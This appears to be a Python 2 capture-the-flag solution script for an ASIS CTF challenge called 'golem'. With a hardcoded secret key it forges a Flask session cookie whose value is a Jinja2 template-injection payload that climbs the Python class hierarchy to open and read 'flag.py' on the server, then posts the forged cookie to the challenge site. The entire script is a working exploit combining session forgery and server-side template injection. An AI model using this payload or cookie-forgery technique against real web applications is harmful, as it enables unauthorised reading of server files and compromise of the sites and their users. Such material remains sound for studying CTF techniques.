import requests

from manageFlaskSession import *

sk = '7h15_5h0uld_b3_r34lly_53cur3d'

cookie = "eyJnb2xlbSI6bnVsbH0.DJSSlQ.vAL-4icbgtyXw6MmaYt_ft4OQ_E"
decodedDict = decodeFlaskCookie(sk, cookie)
print repr(decodedDict)
sessionDict = {u'golem': "{{ ''.__class__.__mro__[2].__subclasses__()[40]('flag.py').read() }}"}
cookie = encodeFlaskCookie(sk, sessionDict)
print cookie

res = requests.post("https://golem.asisctf.com/golem?golem=golem", cookies={"session": cookie})
print res.content